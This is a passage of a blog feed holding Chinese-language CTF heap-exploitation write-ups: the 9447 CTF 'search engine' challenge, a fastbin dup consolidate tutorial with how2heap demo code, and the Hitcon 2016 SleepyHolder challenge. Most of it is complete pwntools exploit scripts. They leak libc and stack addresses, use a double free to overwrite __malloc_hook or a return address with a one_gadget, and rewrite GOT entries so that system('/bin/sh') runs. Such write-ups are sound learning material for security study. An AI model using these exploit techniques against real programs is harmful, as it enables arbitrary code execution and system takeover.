class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>malloc_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>one_addr=libcbase+<span class="hljs-number">0xf0897</span><br>add(<span class="hljs-number">0x60</span>,p64(malloc_addr-<span class="hljs-number">0x23</span>)+<span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">0x58</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-number">0x60</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x13</span>+p64(one_addr)+(<span class="hljs-number">0x60</span>-<span class="hljs-number">8</span>-<span class="hljs-number">0x13</span>)*<span class="hljs-string">b&#x27;c&#x27;</span>)<br><span class="hljs-comment">#p.recv()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="打栈"><a href="#打栈" class="headerlink" title="打栈"></a>打栈</h2><p>跟上一种方法不一样的点就是开始要泄露栈地址以及在最后在栈上找fake chunk</p><h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>就是利用read_enter读入48字节时不添加结束符和read_num如果输入非数字的话会输出输入的字符串（且递归调用自己）泄露栈上的内容<br>调用两次就能泄露出一个栈上的地址</p><img src="/2023/01/31/2015-9447ctf-search-engine/stack.png" class title="stack"><h3 id="找fake-chunk"><a href="#找fake-chunk" class="headerlink" title="找fake chunk"></a>找fake chunk</h3><p>这里我们劫持main函数的返回地址__libc_start_main+240，可以利用gdb的find_fake_fast找fake chunk</p><img src="/2023/01/31/2015-9447ctf-search-engine/return.png" class title="return"><p>注：我最开始想劫持sub_400D60的返回地址。最开始找了个7f的fake chunk，但显示malloc(): memory corruption (fast)了。最后发现是因为malloc的时候栈上的内容改变导致7f没了</p><img src="/2023/01/31/2015-9447ctf-search-engine/malloc1.png" class title="malloc1"><img src="/2023/01/31/2015-9447ctf-search-engine/malloc2.png" class title="malloc2"><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,sentence</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the sentence size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the sentence:\n&#x27;</span>,sentence)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">size,word,delete</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,word)<br>    p.recvuntil(<span class="hljs-string">b&#x27;: &#x27;</span>)<br>    s=p.recvuntil(<span class="hljs-string">b&#x27;Delete&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27; this sentence (y/n)?\n&#x27;</span>,delete)<br>    <span class="hljs-keyword">return</span> s<br><br>p=process(<span class="hljs-string">&#x27;./search&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">48</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;is not a valid number\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">48</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">48</span>)<br>stack=u64(p.recv()[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))+<span class="hljs-number">0x68</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the sentence size:\n&#x27;</span>,<span class="hljs-string">b&#x27;0x10a&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the sentence:\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+<span class="hljs-string">b&#x27; b&#x27;</span>)<br><span class="hljs-comment">#add(0x10a,b&#x27;a&#x27;*0x108+b&#x27; b&#x27;)</span><br>x=index(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;b&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>x=index(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>,<span class="hljs-string">b&#x27;n&#x27;</span>)<br>libcbase=u64(x[:<span class="hljs-number">8</span>])-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">0x68</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x2d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x2d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">0x2d</span>+<span class="hljs-string">b&#x27; dd&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,<span class="hljs-string">b&#x27;dd&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Enter the word size:\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;Enter the word:\n&#x27;</span>,<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Delete this sentence (y/n)?\n&#x27;</span>,<span class="hljs-string">b&#x27;y&#x27;</span>)<br><span class="hljs-comment">#malloc_addr=libcbase+libc.symbols[&#x27;__malloc_hook&#x27;]</span><br>one_addr=libcbase+<span class="hljs-number">0xf0897</span><br>add(<span class="hljs-number">0x30</span>,p64(stack-<span class="hljs-number">0x16</span>)+<span class="hljs-string">b&#x27;0&#x27;</span>*<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;z&#x27;</span>*<span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;x&#x27;</span>*<span class="hljs-number">0x30</span>)<br>gdb.attach(p)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span>+p64(one_addr)+(<span class="hljs-number">0x30</span>-<span class="hljs-number">8</span>-<span class="hljs-number">6</span>)*<span class="hljs-string">b&#x27;c&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;3: Quit\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><span class="hljs-comment">#p.recv()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fastbin dup</tag>
      
      <tag>fastbin dup into stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastbin dup consolidate</title>
    <link href="/2023/01/29/fastbin-dup-consolidate/"/>
    <url>/2023/01/29/fastbin-dup-consolidate/</url>
    
    <content type="html"><![CDATA[<p>一个简单的fastbin dup consolidate U•ェ•*U</p><span id="more"></span><h1 id="相关过程"><a href="#相关过程" class="headerlink" title="相关过程"></a>相关过程</h1><p>malloc的过程中如果chunk属于large bin，那么会计算large bin的index并且调用malloc_consolidate整理fastbin</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>  &#123;<br>    idx = largebin_index (nb);<br>    <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>      malloc_consolidate (av);<br>  &#125;<br></code></pre></td></tr></table></figure><p>malloc_consolidate会整理fastbin中的chunk，能合并的合并然后放进unsorted bin。在之后的遍历unsorted bin的过程中又会把chunk放进small bin<br>由于free一个属于fastbin的chunk时不检查nextchunk的preinuse位，所以可以构造double free</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="2-26以下"><a href="#2-26以下" class="headerlink" title="2.26以下"></a>2.26以下</h2><p>实验代码如下（来自how2heap）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">void</span>* p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br>  <span class="hljs-type">void</span>* p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocated two fastbins: p1=%p p2=%p\n&quot;</span>, p1, p2);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now free p1!\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p1);<br><br>  <span class="hljs-type">void</span>* p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;</span>, p3);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;</span>);<br>  <span class="hljs-built_in">free</span>(p1);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Trigger the double free vulnerability!\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice: %p %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>), <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x40</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>（实验环境2.23）   </p><ul><li>第一次free(p1)<img src="/2023/01/29/fastbin-dup-consolidate/1.png" class title="步骤一"></li><li>malloc(0x400)触发malloc_consolidate<img src="/2023/01/29/fastbin-dup-consolidate/2.png" class title="步骤二"></li><li>第二次free(p1)<img src="/2023/01/29/fastbin-dup-consolidate/3.png" class title="步骤三"></li></ul><h2 id="2-26以上"><a href="#2-26以上" class="headerlink" title="2.26以上"></a>2.26以上</h2><p>需要先填满tcache，其他一样</p><h1 id="例题Hitcon-2016-SleepyHolder"><a href="#例题Hitcon-2016-SleepyHolder" class="headerlink" title="例题Hitcon 2016 SleepyHolder"></a>例题Hitcon 2016 SleepyHolder</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>针不戳~有源码<br>del函数没有检查是否已经del，可以double free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">int</span> choice;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Which Secret do you want to wipe?&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. Small secret&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. Big secret&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-keyword">sizeof</span>(buf));<br>    choice = atoi(buf);<br><br>    <span class="hljs-keyword">switch</span>(choice)<br>    &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">free</span>(f_ptr);<br>            f_flag = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">free</span>(s_ptr);<br>            s_flag = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="思路（fastbin-dup-consolidate-unlink）"><a href="#思路（fastbin-dup-consolidate-unlink）" class="headerlink" title="思路（fastbin_dup_consolidate+unlink）"></a>思路（fastbin_dup_consolidate+unlink）</h2><p>这道题展示了fastbin_dup_consolidate的一个作用，就是可以在使用chunk时同时让nextchunk的preinuse位为0，辅助unlink   </p><ul><li>先add一个small secret再add一个big secret</li><li>对small secret进行fastbin dup consolidate</li><li>在small secret里布置fake chunk，然后delete big secret触发unlink<br>ps：这个时候如果使用gdb heap命令会很奇怪，top chunk没了<img src="/2023/01/29/fastbin-dup-consolidate/heap1.png" class title="heap1">其实big secret和small secret里的fake chunk都收进top chunk里了，看fake chunk的大小就能看出来<img src="/2023/01/29/fastbin-dup-consolidate/heap2.png" class title="heap2">或者看main_arena也能看出来，main_arena+88存的就是top chunk的地址<img src="/2023/01/29/fastbin-dup-consolidate/heap3.png" class title="heap3">pss：之后的过程可能会有点绕o(TヘTo)</li><li>unlink结束后几个存secret的内存是这样的<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">big_secret-&gt; big_chunk<br>huge_secret-&gt; huge_chunk<br>small_secret-&gt; small_secret<span class="hljs-number">-0x18</span><br></code></pre></td></tr></table></figure></li><li>add small secret向small_secret-0x18写payload<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">   b<span class="hljs-number">&#x27;b</span>bbbbbbb<span class="hljs-number">&#x27;</span><br>big_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; atoi_addr<br>huge_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; atoi_addr<br>small_secret-&gt; got[<span class="hljs-string">&#x27;free&#x27;</span>]-&gt; free_addr<br></code></pre></td></tr></table></figure></li><li>update small secret向got[‘free’]写plt[‘puts’]<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">   b<span class="hljs-number">&#x27;b</span>bbbbbbb<span class="hljs-number">&#x27;</span><br>big_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; atoi_addr<br>huge_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; atoi_addr<br>small_secret-&gt; got[<span class="hljs-string">&#x27;free&#x27;</span>]-&gt; plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br></code></pre></td></tr></table></figure></li><li>之后执行delete(big_secret)时实际执行的就是puts(got[‘atoi’])，此时atoi已经执行过所以got表里放的应该就是atoi的地址，减去偏移可以算出libc基址</li><li>再update small secret向got[‘free’]写system_addr<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">   b<span class="hljs-number">&#x27;b</span>bbbbbbb<span class="hljs-number">&#x27;</span><br>big_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; atoi_addr<br>huge_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; atoi_addr<br>small_secret-&gt; got[<span class="hljs-string">&#x27;free&#x27;</span>]-&gt; system_addr<br></code></pre></td></tr></table></figure></li><li>add big secret向got[‘atoi’]写b’&#x2F;bin&#x2F;sh\x00\x00’<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">   b<span class="hljs-number">&#x27;b</span>bbbbbbb<span class="hljs-number">&#x27;</span><br>big_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; b<span class="hljs-number">&#x27;</span>/bin/sh\x00\x00<span class="hljs-number">&#x27;</span><br>huge_secret-&gt; got[<span class="hljs-string">&#x27;atoi&#x27;</span>]-&gt; atoi_addr<br>small_secret-&gt; got[<span class="hljs-string">&#x27;free&#x27;</span>]-&gt; system_addr<br></code></pre></td></tr></table></figure></li><li>再delete(big_secret)时实际执行的就是system(got[‘atoi’])，而got[‘atoi’]这时存的是b’&#x2F;bin&#x2F;sh\x00\x00’，实际执行的就是system(‘&#x2F;bin&#x2F;sh’)</li></ul><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">i,index,secret</span>):<br>    p.sendafter(<span class="hljs-string">b&#x27;3. Renew secret\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">1</span>:<br>        p.sendafter(<span class="hljs-string">b&#x27;2. Big secret\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    <span class="hljs-keyword">else</span>:<br>        p.sendafter(<span class="hljs-string">b&#x27;3. Keep a huge secret and lock it forever\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Tell me your secret: \n&#x27;</span>,secret)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendafter(<span class="hljs-string">b&#x27;3. Renew secret\n&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;2. Big secret\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">index,secret</span>):<br>    p.sendafter(<span class="hljs-string">b&#x27;3. Renew secret\n&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;2. Big secret\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Tell me your secret: \n&#x27;</span>,secret)<br><br>p=process(<span class="hljs-string">&#x27;./SleepyHolder&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./SleepyHolder&#x27;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;Q&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(<span class="hljs-number">0x6020d0</span>-<span class="hljs-number">0x18</span>)+p64(<span class="hljs-number">0x6020d0</span>-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,payload)<br>delete(<span class="hljs-number">2</span>)<br>gdb.attach(p)<br>payload=<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>])*<span class="hljs-number">2</span>+p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])<br>update(<span class="hljs-number">1</span>,payload)<br>update(<span class="hljs-number">1</span>,p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]))<br>delete(<span class="hljs-number">2</span>)<br>s=p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>libcbase=u64(s)-libc.symbols[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>system_addr=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>update(<span class="hljs-number">1</span>,p64(system_addr))<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;/bin/sh\x00\x00&#x27;</span>)<br>delete(<span class="hljs-number">2</span>)<br>p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unsafe unlink</title>
    <link href="/2023/01/29/unsafe-unlink/"/>
    <url>/2023/01/29/unsafe-unlink/</url>
    
